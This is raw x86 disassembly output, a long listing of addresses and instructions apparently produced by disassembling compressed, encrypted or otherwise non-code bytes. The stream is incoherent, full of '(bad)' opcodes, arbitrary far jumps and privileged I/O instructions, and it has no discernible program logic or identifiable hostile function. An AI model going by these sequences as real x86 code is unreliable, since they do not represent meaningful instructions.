  424274:	xchg   DWORD PTR [ebx+eiz*4-0x204c28],esi
  42427b:	push   DWORD PTR [ecx+0x7]
  42427e:	sub    al,0x5c
  424280:	ins    DWORD PTR es:[edi],dx
  424281:	test   DWORD PTR [edx+0x1823d9c],0x10500
  42428b:	add    bl,bl
  42428d:	cmp    eax,0x200fc694
  424292:	daa    
  424293:	sub    esp,0xffffffac
  424296:	jp     0x424259
  424298:	pop    ebp
  424299:	cmp    al,0x90
  42429b:	pop    ds
  42429c:	inc    edx
  42429d:	daa    
  42429e:	and    al,0x24
  4242a0:	in     al,dx
  4242a1:	sbb    esp,DWORD PTR [ebx+0x1a]
  4242a4:	cli    
  4242a5:	inc    eax
  4242a6:	(bad)  [ebx-0x11]
  4242a9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4242aa:	stc    
  4242ab:	mov    ebx,DWORD PTR [ecx+edx*4]
  4242ae:	jle    0x424280
  4242b0:	in     eax,dx
  4242b1:	(bad)  
  4242b3:	dec    ecx
  4242b4:	xchg   ebp,eax
  4242b5:	pop    ecx
  4242b6:	lods   eax,DWORD PTR ds:[esi]
  4242b7:	dec    esi
  4242b8:	lahf   
  4242b9:	mov    al,ds:0x4ff008a
  4242be:	call   FWORD PTR [esi-0x428e75ba]
  4242c4:	push   edx
  4242c5:	push   eax
  4242c6:	adc    esp,esp
  4242c8:	ss and ah,ah
  4242cb:	shl    esp,1
  4242cd:	daa    
  4242ce:	push   eax
  4242cf:	jmp    0xe7bb:0x1797e183
  4242d6:	cmc    
  4242d7:	pop    DWORD PTR [esi]
  4242d9:	or     dl,BYTE PTR [ebx+0x62]
  4242dc:	push   edi
  4242dd:	(bad)  
  4242df:	pop    eax
  4242e0:	and    DWORD PTR [edx+0x7fdcd72d],esp
  4242e6:	sub    ebx,DWORD PTR [ebx]
  4242e8:	pushf  
  4242e9:	ror    BYTE PTR [edi-0x32],0xa8
  4242ed:	cs inc esi
  4242ef:	pop    ebp
  4242f0:	pop    esi
  4242f1:	sbb    al,0xe8
  4242f3:	mov    al,ds:0xaf1be4e2
  4242f8:	pushf  
  4242f9:	hlt    
  4242fa:	xchg   BYTE PTR [eax],dl
  4242fc:	stc    
  4242fd:	or     ecx,esi
  4242ff:	add    eax,0x35d2ddc0
  424304:	cmp    bh,BYTE PTR [ecx-0x31]
  424307:	inc    eax
  424308:	aam    0x35
  42430a:	sbb    eax,0x18959ef6
  42430f:	imul   ecx,DWORD PTR [edi],0x4c
  424312:	fdiv   DWORD PTR [edi+edx*1-0x2fa70b2f]
  424319:	ret    0xa29c
  42431c:	xor    esi,DWORD PTR [esi]
  42431e:	in     eax,dx
  42431f:	(bad)  
  424320:	push   esp
  424321:	mov    ds:0x94e65827,eax
  424326:	shl    DWORD PTR [ebx+ebp*1+0x10],1
  42432a:	jnp    0x424391
  42432c:	int    0xc8
  42432e:	mov    ecx,0xbc311945
  424333:	sbb    edi,DWORD PTR [eax+0x3dd33827]
  424339:	push   edx
  42433a:	je     0x42431f
  42433c:	jmp    0x5411:0x1d83ccf3
  424343:	aam    0xa1
  424345:	mov    esi,DWORD PTR [ebx+eax*1-0x2e2829b8]
  42434c:	and    BYTE PTR [esi-0x55],0x41
  424350:	mov    bl,0x5b
  424352:	mov    ch,BYTE PTR [esi+0x43]
  424355:	int    0xe0
  424357:	inc    ebp
  424358:	inc    esp
  424359:	jo     0x42436a
  42435b:	lods   al,BYTE PTR ds:[esi]
  42435c:	push   ebp
  42435d:	sub    DWORD PTR [ebx+esi*2],ebp
  424360:	xor    eax,0xcf479e64
  424365:	push   edi
  424366:	pushf  
  424367:	dec    ebx
  424368:	aad    0x74
  42436a:	in     al,dx
  42436b:	push   0xed3790d5
  424370:	loopne 0x4243e5
  424372:	das    
  424373:	popf   
  424374:	data16 loop 0x4243e6
  424377:	in     eax,dx
  424378:	xchg   ebp,eax
  424379:	jge    0x4243d5
  42437b:	out    0x43,al
  42437d:	push   eax
  42437e:	les    eax,FWORD PTR [ebp-0x45a243e4]
  424384:	dec    ebp
  424385:	add    al,0xea
  424387:	sbb    eax,0x5ee1c3c6
  42438c:	lods   al,BYTE PTR ds:[esi]
  42438d:	jecxz  0x424346
  42438f:	rcr    BYTE PTR [ebx],cl
	...
  4243f1:	add    BYTE PTR [eax],al
  4243f3:	add    BYTE PTR [edx-0x24582da],cl
  4243f9:	sti    
  4243fa:	iret   
  4243fb:	ss aam 0xb
  4243fe:	push   ss
  4243ff:	jno    0x424393
  424401:	sbb    dx,WORD PTR [ebp+0x18342]
  424408:	add    eax,0x32000001
  42440d:	fdivr  st(3),st
  42440f:	stos   BYTE PTR es:[edi],al
  424410:	push   ds
  424411:	pop    edx
  424412:	jmp    0x424432
  424414:	cli    
  424415:	sub    DWORD PTR [esi-0x74860d89],eax
  42441b:	sbb    ch,bh
  42441d:	sub    al,cl
  42441f:	jbe    0x4243ee
  424421:	cs jb  0x4243ec
  424424:	aad    0x89
  424426:	mov    al,ds:0x1ad0564c
  42442b:	sbb    bl,BYTE PTR [edi+eiz*4-0x6055e4bc]
  424432:	mov    eax,0xa6fe3359
  424437:	shl    bl,0x55
  42443a:	fldcw  WORD PTR [eax+0x5a]
  42443d:	mov    edx,DWORD PTR [ecx-0x3f]
  424440:	inc    ebp
  424441:	into   
  424442:	lahf   
  424443:	and    BYTE PTR [esi],ch
  424445:	aaa    
  424446:	lahf   
  424447:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424448:	dec    edi
  424449:	sbb    eax,0x2881aa74
  42444e:	idiv   DWORD PTR [edx]
  424450:	cld    
  424451:	les    esp,FWORD PTR ds:0x5864ed4
  424457:	ret    
  424458:	mov    eax,0xd8f2973d
  42445d:	div    DWORD PTR [ebx+eiz*2+0x1a]
  424461:	and    al,0x2b
  424463:	xchg   DWORD PTR [ecx-0x44],eax
  424466:	push   ss
  424467:	jne    0x4243f7
  424469:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42446a:	pop    eax
  42446b:	in     al,dx
  42446c:	sbb    al,0xa0
  42446e:	outs   dx,DWORD PTR ds:[esi]
  42446f:	jbe    0x42448c
  424471:	jl     0x4244dd
  424473:	push   eax
  424474:	xchg   bh,bl
  424476:	jbe    0x424488
  424478:	adc    dl,dh
  42447a:	ss xchg ebp,eax
  42447c:	es mov edi,0xfc129bce
  424482:	int    0xd
  424484:	sub    ecx,DWORD PTR [esi+0x5d]
  424487:	call   0x9518:0x395f733
  42448e:	not    BYTE PTR ds:0x2b51db57
  424494:	mov    cl,0x16
  424496:	addr16 jmp 0x4244fd
  424499:	adc    edx,DWORD PTR [esi-0x32]
  42449c:	xor    BYTE PTR [eax+edx*1],bh
  42449f:	aaa    
  4244a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4244a1:	stos   DWORD PTR es:[edi],eax
  4244a2:	add    al,0xa3
  4244a4:	cmp    al,0x4d
  4244a6:	sub    eax,0xadd08fb8
  4244ab:	pop    esp
  4244ac:	aas    
  4244ad:	push   ss
  4244ae:	cdq    
  4244af:	out    0xb2,eax
  4244b1:	nop
  4244b2:	test   DWORD PTR [edx-0x5bb7ce36],0xab88660d
  4244bc:	xchg   ebp,eax
  4244bd:	pop    ds
  4244be:	push   cs
  4244bf:	or     eax,0x72e0ab0c
  4244c4:	int3   
  4244c5:	mov    esi,0x6ccc4b1c
  4244ca:	cli    
  4244cb:	push   eax
  4244cc:	or     al,0x46
  4244ce:	inc    eax
  4244cf:	ja     0x42445e
  4244d1:	push   ebp
  4244d2:	aam    0x7e
  4244d4:	fwait
  4244d5:	cmp    eax,0xf482f15d
  4244da:	push   edi
  4244db:	(bad)  [edi+0x2d]
  4244de:	mov    bh,0x2d
  4244e0:	sbb    DWORD PTR [eax+0x2e],edx
  4244e3:	sub    BYTE PTR [edi],bl
  4244e5:	icebp  
  4244e6:	dec    ebx
  4244e7:	dec    edi
  4244e8:	xchg   al,bh
  4244ea:	add    edx,DWORD PTR [edi-0x79]
  4244ed:	sub    eax,0xc980c099
  4244f2:	mov    WORD PTR ds:[edi-0x248e8b02],di
  4244fa:	pop    edi
  4244fb:	or     eax,0x724ebf8b
  424500:	dec    edi
  424501:	cdq    
  424502:	mov    esi,0x607b8944
  424507:	imul   esi,DWORD PTR [edi+0x3],0x3d
  42450b:	outs   dx,BYTE PTR ds:[esi]
  42450c:	sub    esi,DWORD PTR [edi+0x27334d]
	...
  424572:	add    BYTE PTR [eax],al
  424574:	loopne 0x4245e5
  424576:	xchg   esi,eax
  424577:	inc    edx
  424578:	lahf   
  424579:	sti    
  42457a:	hlt    
  42457b:	out    dx,eax
  42457c:	dec    eax
  42457d:	rol    DWORD PTR [esp+ebx*4+0x69],1
  424581:	mov    dh,0xe2
  424583:	icebp  
  424584:	inc    edi
  424585:	test   BYTE PTR [ecx],al
  424587:	add    BYTE PTR ds:0xcc000001,al
  42458d:	ret    
  42458e:	les    esp,FWORD PTR [ecx]
  424590:	xor    BYTE PTR [esi+0x6a],dh
  424593:	outs   dx,BYTE PTR ds:[esi]
  424594:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424595:	fsub   st,st(3)
  424597:	adc    ah,BYTE PTR [ebx+0x19]
  42459a:	leave  
  42459b:	enter  0x9fb,0x83
  42459f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4245a0:	add    al,0x5e
  4245a3:	pop    ebx
  4245a4:	add    eax,0xe15de134
  4245a9:	retf   
  4245aa:	and    eax,0x2ccb164
  4245af:	add    eax,0x8466d893
  4245b4:	dec    esp
  4245b5:	mov    WORD PTR [ebp+0x24],?
  4245b8:	test   DWORD PTR [ebp-0x1e4f97f4],esp
  4245be:	(bad)  
  4245bf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4245c0:	add    eax,0xf21aebfe
  4245c5:	and    BYTE PTR [esi-0x3778a1ea],al
  4245cb:	sub    ecx,DWORD PTR [ecx]
  4245cd:	mov    bl,0xc8
  4245cf:	out    0x46,al
  4245d1:	jne    0x424572
  4245d3:	call   0x2766:0x51299dcd
  4245da:	sub    eax,0x42b544e6
  4245df:	dec    cl
  4245e1:	jnp    0x4245e7
  4245e3:	pushf  
  4245e4:	imul   ecx,DWORD PTR [edx+0x67840dfb],0xffffff96
  4245eb:	sub    eax,0xbf24cea6
  4245f0:	loop   0x424618
  4245f2:	cmp    eax,DWORD PTR [edi+0x2e0a6984]
  4245f8:	imul   esp,edi,0x7f53822
  4245fe:	jno    0x4245a6
  424600:	or     al,0x47
  424602:	ins    DWORD PTR es:[edi],dx
  424603:	mov    BYTE PTR [esi+0x643aef2e],0x88
  42460a:	popa   
  42460b:	popf   
  42460c:	ret    
  42460d:	push   esi
  42460e:	xchg   ecx,eax
  42460f:	dec    esp
  424610:	and    bl,bl
  424612:	jmp    0x42459e
  424614:	pop    ss
  424615:	xchg   edx,eax
  424616:	cli    
  424617:	mov    edi,DWORD PTR [esi+esi*2-0x38c1384b]
  42461e:	xor    eax,0x30d0b9b
  424623:	jge    0x4246a3
  424625:	cmp    al,0xbe
  424627:	test   eax,0x9714ed3d
  42462c:	and    cl,BYTE PTR [ecx+0x2bfbfaa4]
  424632:	inc    ecx
  424633:	jl     0x4246b2
  424635:	enter  0x535d,0x9b
  424639:	lods   eax,DWORD PTR ds:[esi]
  42463a:	cmp    DWORD PTR [edx+0x730e3847],esi
  424640:	mov    eax,ds:0x957c8b7b
  424645:	out    0xb8,eax
  424647:	add    ah,bh
  424649:	and    al,0xb1
  42464b:	add    edi,edi
  42464d:	add    esi,edi
  42464f:	cld    
  424650:	dec    ebp
  424651:	cmovae ebp,DWORD PTR [eax]
  424654:	mov    ds:0x47cae656,eax
  424659:	mov    ebp,0x867dad11
  42465e:	cmp    BYTE PTR [edx+0x26],al
  424661:	xor    al,0x76
  424663:	jnp    0x424641
  424665:	add    ebx,DWORD PTR [ebx-0x4b5d2332]
  42466b:	out    dx,al
  42466c:	sbb    BYTE PTR [ecx],ah
  42466e:	jge    0x4246cd
  424670:	pop    ss
  424671:	fbld   TBYTE PTR [ecx+ecx*4-0x33]
  424675:	add    al,bl
  424677:	sar    BYTE PTR [ebp-0x5d],0xd2
  42467b:	das    
  42467c:	cmp    ch,BYTE PTR [ebx+0x2612f898]
  424682:	(bad)  
  424684:	inc    esp
  424685:	cs mov al,cl
  424688:	fadd   QWORD PTR [ecx-0x2e0bb326]
  42468e:	cs (bad) 
  424690:	add    BYTE PTR ss:[eax],al
	...
  4246f3:	add    BYTE PTR [edx+edx*4-0x10004],bh
  4246fa:	mov    edi,0xb298dbd3
  4246ff:	mov    bl,cl
  424701:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424702:	sar    DWORD PTR [edi+0x4c],1
  424705:	test   DWORD PTR [ecx],eax
  424707:	add    BYTE PTR ds:0x73000001,al
  42470d:	outs   dx,DWORD PTR ds:[esi]
  42470e:	push   ebx
  42470f:	div    DWORD PTR [esp+ebp*4]
  424712:	ss inc edx
  424714:	mov    BYTE PTR [ebx-0x37cd53b2],bl
  42471a:	jg     0x42475d
  42471c:	test   eax,0x8b72a9fa
  424721:	xlat   BYTE PTR ds:[ebx]
  424722:	mov    esp,0xa98dcb8d
  424727:	lods   al,BYTE PTR ds:[esi]
  424728:	arpl   WORD PTR [esi],sp
  42472a:	scas   eax,DWORD PTR es:[edi]
  42472b:	fcomip st,st(5)
  42472d:	or     al,0x83
  42472f:	mov    WORD PTR [esi+eiz*4],gs
  424732:	inc    eax
  424733:	jmp    0x99b8fa1d
  424738:	mov    bh,0xd7
  42473a:	cli    
  42473b:	xchg   ecx,eax
  42473c:	and    eax,0xb2591db1
  424741:	add    eax,0xd282709a
  424746:	xchg   edx,eax
  424747:	stc    
  424748:	sub    bh,BYTE PTR [ebp-0x5878a415]
  42474e:	(bad)  
  42474f:	mov    al,0x2
  424751:	retf   
  424752:	cmp    edx,DWORD PTR [ecx-0x27]
  424755:	lock je 0x4246ff
  424758:	inc    ebp
  424759:	shl    edx,0x3e
  42475c:	sbb    eax,0xd71322a1
  424761:	jecxz  0x4247d3
  424763:	sub    eax,0xa6f46dbd
  424768:	push   cs
  424769:	sub    BYTE PTR [eax-0x33],al
  42476c:	loope  0x4247b3
  42476e:	jge    0x4246f0
  424770:	int    0x41
  424772:	jne    0x4247ae
  424774:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424775:	imul   edi,DWORD PTR [edx-0x1b],0xffffffa8
  424779:	sbb    eax,0xd4d972fb
  42477e:	jae    0x42479e
  424780:	pop    ecx
  424781:	mov    cs,WORD PTR [ebx]
  424783:	dec    eax
  424784:	mov    esp,0x6a784f5b
  424789:	xchg   edi,eax
  42478a:	gs repz push 0xffffffed
  42478e:	imul   eax,DWORD PTR ds:0x4a798440,0x12b9facf
  424798:	mov    ebx,0x616c9707
  42479d:	aam    0x63
  42479f:	or     DWORD PTR [ebp+0x14],0x51c541a2
  4247a6:	gs pop edi
  4247a8:	jne    0x424826
  4247aa:	iret   
  4247ab:	in     al,0x2e
  4247ad:	in     eax,dx
  4247ae:	or     cl,BYTE PTR [edx]
  4247b0:	adc    esp,DWORD PTR ds:0x3d50eb84
  4247b6:	sub    DWORD PTR [eax-0x77],ebp
  4247b9:	jbe    0x4247b1
  4247bb:	jns    0x424749
  4247bd:	rep stos DWORD PTR es:[edi],eax
  4247bf:	mov    eax,0xc6772735
  4247c4:	jg     0x424769
  4247c6:	in     al,dx
  4247c7:	in     eax,0xe6
  4247c9:	push   esi
  4247ca:	xor    al,0x7a
  4247cc:	fs gs cdq 
  4247cf:	mov    edx,esp
  4247d1:	fmulp  st(4),st
  4247d3:	pop    esp
  4247d4:	xor    dh,bh
  4247d6:	pop    ss
  4247d7:	and    al,0x4b
  4247d9:	dec    esp
  4247da:	repz mov bh,0xac
  4247dd:	imul   esp,DWORD PTR [ecx],0xffffff82
  4247e0:	fldcw  WORD PTR [ecx-0x74]
  4247e3:	adc    DWORD PTR [edi+ebx*1-0x3d],esp
  4247e7:	mov    cl,0xb0
  4247e9:	les    ecx,FWORD PTR [ecx]
  4247eb:	ja     0x424811
  4247ed:	fdivr  QWORD PTR [ebx-0x1c]
  4247f0:	jmp    0x4247ea
  4247f2:	inc    ebx
  4247f3:	ss jp  0x424796
  4247f6:	sbb    al,0x31
  4247f8:	shl    DWORD PTR [edi],cl
  4247fa:	call   0x74ca:0x842e9018
  424801:	mov    edi,0xb080acd2
  424806:	daa    
  424807:	jecxz  0x42485b
  424809:	ret    
  42480a:	inc    ebp
  42480b:	scas   eax,DWORD PTR es:[edi]
  42480c:	cmp    ecx,edx
  42480e:	and    edx,DWORD PTR [ebx+0x66]
	...
  424871:	add    BYTE PTR [eax],al
  424873:	add    BYTE PTR [edx],ah
  424875:	pop    eax
  424876:	test   bh,ch
  424878:	(bad)  
  424879:	jmp    FWORD PTR [ebx-0x23]
  42487c:	lock test BYTE PTR [ebx],dl
  42487f:	xchg   esp,eax
  424880:	and    dl,BYTE PTR [ebx+eax*8]
  424883:	repz push ecx
  424885:	xchg   BYTE PTR [ecx],al
  424887:	add    BYTE PTR ds:0x9b000001,al
  42488d:	aam    0x8
  42488f:	jmp    0xd200b459
  424894:	xchg   esp,eax
  424895:	jo     0x424886
  424897:	mov    al,0xff
  424899:	cmp    eax,0xa3560676
  42489e:	add    eax,edx
  4248a0:	aam    0xc0
  4248a2:	sub    bh,BYTE PTR [ebx-0x38562911]
  4248a8:	in     eax,dx
  4248a9:	dec    ebx
  4248aa:	outs   dx,BYTE PTR ds:[esi]
  4248ab:	jmp    0xd528278
  4248b0:	xor    al,0xab
  4248b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4248b3:	icebp  
  4248b4:	pop    edx
  4248b5:	test   BYTE PTR [eax+0x5e],al
  4248b8:	enter  0xdc9c,0x7a
  4248bc:	cmp    BYTE PTR [ecx+0x144763a4],ah
  4248c2:	adc    al,0xa7
  4248c4:	mov    ds:0x63950416,eax
  4248c9:	inc    esp
  4248ca:	jecxz  0x4248d9
  4248cc:	pop    es
  4248cd:	ja     0x4248c6
  4248cf:	outs   dx,DWORD PTR ds:[esi]
  4248d0:	neg    DWORD PTR ds:0x479f0cf8
  4248d6:	daa    
  4248d7:	or     ah,BYTE PTR [ebp+0x78]
  4248da:	dec    eax
  4248db:	(bad)  
  4248dc:	push   ebx
  4248dd:	xchg   DWORD PTR [edx+ebp*1-0x77],esp
  4248e1:	xchg   ebp,eax
  4248e2:	call   0x8262d5e8
  4248e7:	and    DWORD PTR [ebp+0x368a3bb5],edx
  4248ed:	int3   
  4248ee:	xor    al,0x79
  4248f0:	loopne 0x42489f
  4248f2:	ja     0x4248fd
  4248f4:	test   BYTE PTR [edi],bh
  4248f6:	mov    dh,0xab
  4248f8:	(bad)  
  4248f9:	fcom   QWORD PTR [edx+0x7e4e3dba]
  4248ff:	pop    ebp
  424900:	mov    esi,0xbe59ee61
  424905:	daa    
  424906:	(bad)  
  424907:	jo     0x4248f1
  424909:	mov    cl,0x8e
  42490b:	jp     0x424979
  42490d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42490e:	jp     0x42496c
  424910:	pop    eax
  424911:	add    DWORD PTR es:[eax+0x46],edi
  424915:	mov    eax,ds:0x1b6fa6f1
  42491a:	ds icebp 
  42491c:	mov    eax,0x1a59fe10
  424921:	adc    eax,0xa3ae9067
  424926:	xchg   edx,eax
  424927:	nop
  424928:	fidiv  DWORD PTR [edi+0x31]
  42492b:	inc    ebp
  42492c:	bound  ebx,QWORD PTR ds:[edx+0x57009efb]
  424933:	add    DWORD PTR [edx+eiz*2],0xffffff8e
  424937:	and    eax,0xd6f5a93d
  42493c:	call   0xf74e9364
  424941:	jae    0x42496a
  424943:	inc    ebx
  424944:	push   edi
  424945:	les    ebp,FWORD PTR [edx+eax*4]
  424948:	mov    ah,0xad
  42494a:	addr16 cli 
  42494c:	ja     0x424949
  42494e:	jbe    0x4248fb
  424950:	add    al,0x78
  424952:	inc    edi
  424953:	pop    ss
  424954:	mov    ds:0x6917d80b,eax
  424959:	rol    DWORD PTR [esi-0x7ec3c46b],cl
  42495f:	jno    0x4249a5
  424961:	ins    DWORD PTR es:[edi],dx
  424962:	mov    cl,0x93
  424964:	xchg   ebx,eax
  424965:	inc    eax
  424966:	out    0x2c,al
  424968:	cmp    eax,0x19a9e9c3
  42496d:	(bad)  
  42496e:	mov    ecx,0x160edde
  424973:	or     BYTE PTR [ecx],cl
  424975:	xor    dh,0x93
  424978:	jae    0x42491a
  42497a:	test   DWORD PTR [ebx-0x14],eax
  42497d:	adc    edx,edx
  42497f:	(bad)  
  424980:	sahf   
  424981:	inc    edi
  424982:	gs les ebx,FWORD PTR gs:[eax-0x70]
  424987:	mov    al,ds:0x3d34c71
  42498c:	data16 sub BYTE PTR [edx+0xbfb7],0x0
	...
  4249f4:	imul   ebx,DWORD PTR [eax],0x63
  4249f7:	push   0x73
  4249f9:	jnp    0x424a66
  4249fb:	sbb    DWORD PTR [eax-0x5c],ecx
  4249fe:	push   esi
  4249ff:	xor    dh,BYTE PTR [ecx]
  424a01:	xchg   esp,eax
  424a02:	xchg   ebx,eax
  424a03:	push   edi
  424a04:	push   esi
  424a05:	xchg   DWORD PTR [ecx],eax
  424a07:	add    BYTE PTR ds:0x51000001,al
  424a0d:	mov    ch,0xd7
  424a0f:	in     eax,dx
  424a10:	inc    ebx
  424a11:	xchg   ebx,eax
  424a12:	ins    DWORD PTR es:[di],dx
  424a14:	xchg   ecx,eax
  424a15:	sbb    DWORD PTR [ecx-0x61e2e621],edx
  424a1b:	cs xchg edi,eax
  424a1e:	shr    esp,0x14
  424a21:	push   0x9f4a9b16
  424a26:	sbb    edx,DWORD PTR [eax+0x34ff8bbc]
  424a2c:	(bad)  
  424a2d:	mov    ch,0xeb
  424a2f:	arpl   ax,dx
  424a31:	repnz inc eax
  424a33:	std    
  424a34:	or     cl,BYTE PTR [esi]
  424a36:	aas    
  424a37:	mov    ds:0x8457188,eax
  424a3c:	shl    BYTE PTR ss:[ebx+0x7f052484],cl
  424a43:	icebp  
  424a44:	dec    ebp
  424a45:	dec    edi
  424a46:	inc    eax
  424a47:	jp     0x4249e7
  424a49:	loope  0x424a63
  424a4b:	pushf  
  424a4c:	jl     0x424a30
  424a4e:	add    BYTE PTR [ebp+0x62],ch
  424a51:	dec    eax
  424a52:	out    0xc,al
  424a54:	sbb    ebp,ecx
  424a56:	fldcw  WORD PTR [ecx-0x3d]
  424a59:	jecxz  0x424a43
  424a5b:	mov    DWORD PTR [edi-0x5a306ebd],edx
  424a61:	fs pop esp
  424a63:	lods   al,BYTE PTR ds:[esi]
  424a64:	call   0xd60e:0x132d6598
  424a6b:	pop    ecx
  424a6c:	push   ss
  424a6d:	mov    fs,WORD PTR [ebx]
  424a6f:	int3   
  424a70:	inc    edi
  424a71:	out    0xa4,al
  424a73:	add    ebx,DWORD PTR [eax+0x44]
  424a76:	adc    dh,0xc
  424a79:	push   edx
  424a7a:	adc    eax,0x3a3369a2
  424a7f:	jb     0x424a29
  424a81:	nop
  424a82:	xlat   BYTE PTR ds:[ebx]
  424a83:	in     al,dx
  424a84:	clc    
  424a85:	push   ds
  424a86:	fimul  WORD PTR [edx+0x69]
  424a89:	mov    fs:0x7fe95d41,al
  424a8f:	jno    0x424afd
  424a91:	stos   BYTE PTR es:[edi],al
  424a92:	nop
  424a93:	or     DWORD PTR [esi-0x9622c2b],ebp
  424a99:	mov    cl,0x74
  424a9b:	mov    BYTE PTR [ebx],dh
  424a9d:	scas   al,BYTE PTR es:[edi]
  424a9e:	push   ds
  424a9f:	ds or  al,0xa5
  424aa2:	fcmovnb st,st(2)
  424aa4:	nop
  424aa5:	mov    ecx,0x6bbd9e7c
  424aaa:	and    BYTE PTR [esi+0x662fdf75],bh
  424ab0:	cmp    ebp,DWORD PTR [edi]
  424ab2:	(bad)  
  424ab3:	and    dh,BYTE PTR [esi-0x3c]
  424ab6:	shl    BYTE PTR [esi-0x34145310],1
  424abc:	xchg   esi,eax
  424abd:	lods   eax,DWORD PTR ds:[esi]
  424abe:	in     al,0x77
  424ac0:	mov    edi,0xbd4b004a
  424ac5:	popf   
  424ac6:	jge    0x424ad4
  424ac8:	stos   BYTE PTR es:[edi],al
  424ac9:	fwait
  424aca:	add    eax,0x12f49c87
  424acf:	jmp    0xc2ddf913
  424ad4:	jmp    0x32f9:0xf745ee9f
  424adb:	(bad)  
  424adc:	aam    0x18
  424ade:	adc    DWORD PTR ds:0x865667e3,edi
  424ae4:	rcr    cl,1
  424ae6:	jge    0x424a7b
  424ae8:	xchg   ebp,eax
  424ae9:	out    dx,al
  424aea:	pusha  
  424aeb:	das    
  424aec:	sub    bh,BYTE PTR ds:0x9394d72f
  424af2:	jb     0x424b6c
  424af4:	arpl   WORD PTR [eax-0x55ffd530],bp
  424afa:	sbb    bh,BYTE PTR [ebp-0x17714c91]
  424b00:	mov    ebp,0x29a8fcf2
  424b05:	push   ecx
  424b06:	dec    edx
  424b07:	xchg   ecx,eax
  424b08:	inc    esp
  424b09:	int    0x84
  424b0b:	ffree  st(3)
  424b0d:	ficom  DWORD PTR [ecx+0xcd46]
	...
  424b73:	add    BYTE PTR [esi],al
  424b75:	aas    
  424b76:	or     eax,0xb6bb3db9
  424b7b:	mov    edi,0xdc50081e
  424b80:	ja     0x424b46
  424b82:	jle    0x424bf6
  424b84:	pop    ebx
  424b85:	mov    BYTE PTR [ecx],al
  424b87:	add    BYTE PTR ds:0x74000001,al
  424b8d:	xlat   BYTE PTR ds:[ebx]
  424b8e:	test   eax,0xe2c66d0b
  424b93:	ror    BYTE PTR [ecx-0x2e3c0f15],1
  424b99:	test   eax,0x28f6a3d
  424b9e:	fiadd  DWORD PTR [edx+0x78bbbbd1]
  424ba4:	jae    0x424bbe
  424ba6:	adc    esi,edi
  424ba8:	out    dx,eax
  424ba9:	lods   eax,DWORD PTR ds:[esi]
  424baa:	cwde   
  424bab:	and    BYTE PTR [ebx],dl
  424bad:	mov    ecx,DWORD PTR [ebx+0x601b6709]
  424bb3:	xchg   edi,eax
  424bb4:	sbb    ecx,DWORD PTR [edx-0x29]
  424bb7:	(bad)  
  424bb8:	jmp    0x2cc5:0x862ee856
  424bbf:	in     eax,dx
  424bc0:	loope  0x424b8e
  424bc2:	jle    0x424c16
  424bc4:	mov    ebp,0xc2a4cf8e
  424bc9:	lods   eax,DWORD PTR ds:[esi]
  424bca:	(bad)  
  424bcb:	fbld   TBYTE PTR [eax+0x55]
  424bce:	mov    bh,0x80
  424bd0:	nop
  424bd1:	rol    BYTE PTR [ecx],0x3d
  424bd4:	mov    eax,ds:0xf157a873
  424bd9:	inc    ebx
  424bda:	gs in  al,dx
  424bdc:	mov    dl,0x1e
  424bde:	sahf   
  424bdf:	in     eax,0xcd
  424be1:	add    BYTE PTR [ecx-0x5],cl
  424be4:	sub    BYTE PTR [edi+0x10],ah
  424be7:	fistp  WORD PTR [edi+0x7a29ee3]
  424bed:	mov    eax,ds:0x2a3f2b39
  424bf2:	mov    ebx,0x2478c842
  424bf7:	call   0xf4f0:0x3f54b43c
  424bfe:	sti    
  424bff:	jb     0x424bf4
  424c01:	call   0xad8cda2e
  424c06:	push   ebx
  424c07:	ja     0x424b9c
  424c09:	fimul  DWORD PTR ds:0x376e0103
  424c0f:	add    BYTE PTR [ebp+0x5b],dh
  424c12:	and    BYTE PTR [edx+0x42],al
  424c15:	out    0x1,al
  424c17:	leave  
  424c18:	nop
  424c19:	ja     0x424bec
  424c1b:	add    al,0xf3
  424c1d:	and    cl,bl
  424c1f:	fwait
  424c20:	ins    DWORD PTR es:[edi],dx
  424c21:	inc    BYTE PTR [esp+ebp*2]
  424c24:	xchg   ecx,eax
  424c25:	push   cs
  424c26:	xor    al,0xf1
  424c28:	cmp    DWORD PTR [ebp+0x29c38689],esi
  424c2e:	push   edx
  424c2f:	div    dl
  424c31:	test   ebx,ecx
  424c33:	xlat   BYTE PTR ds:[ebx]
  424c34:	repnz shl BYTE PTR [ecx+0x33f876b2],cl
  424c3b:	lock shl BYTE PTR [edi],cl
  424c3e:	or     DWORD PTR [ecx],esi
  424c40:	hlt    
  424c41:	aas    
  424c42:	aad    0x4
  424c44:	pop    edx
  424c45:	int3   
  424c46:	mov    al,0xc5
  424c48:	in     eax,0xdb
  424c4a:	jo     0x424c98
  424c4c:	push   esp
  424c4d:	dec    esp
  424c4e:	dec    ecx
  424c4f:	dec    ecx
  424c50:	fsub   DWORD PTR [ecx+0x185a3671]
  424c56:	in     al,0x74
  424c58:	mov    DWORD PTR [esi-0x17eaf553],ecx
  424c5e:	fwait
  424c5f:	and    ebx,ebp
  424c61:	test   eax,0x59720a23
  424c66:	push   0xcf7740b5
  424c6b:	cdq    
  424c6c:	dec    esi
  424c6d:	jno    0x424c24
  424c6f:	adc    DWORD PTR [edx+0x6d],ecx
  424c72:	cmp    eax,0x5f03ccd5
  424c77:	sbb    al,0xf4
  424c79:	clc    
  424c7a:	jae    0x424c1d
  424c7c:	std    
  424c7d:	retf   
  424c7e:	mov    al,ds:0xb66b046c
  424c83:	sti    
  424c84:	mov    ebp,0x9e192da3
  424c89:	pop    eax
  424c8a:	sbb    al,0x6e
  424c8c:	(bad)  
  424c8d:	jmp    0x424c54
  424c8f:	or     DWORD PTR [ecx+0x0],eax
	...
  424cf1:	add    BYTE PTR [eax],al
  424cf3:	add    BYTE PTR [edx+ebx*8-0x4c],ch
  424cf7:	push   0xffffffb6
  424cf9:	outs   dx,BYTE PTR ds:[esi]
  424cfa:	(bad)  
  424cfb:	fisub  WORD PTR [edx-0x65]
  424cfe:	test   al,0x51
  424d00:	cli    
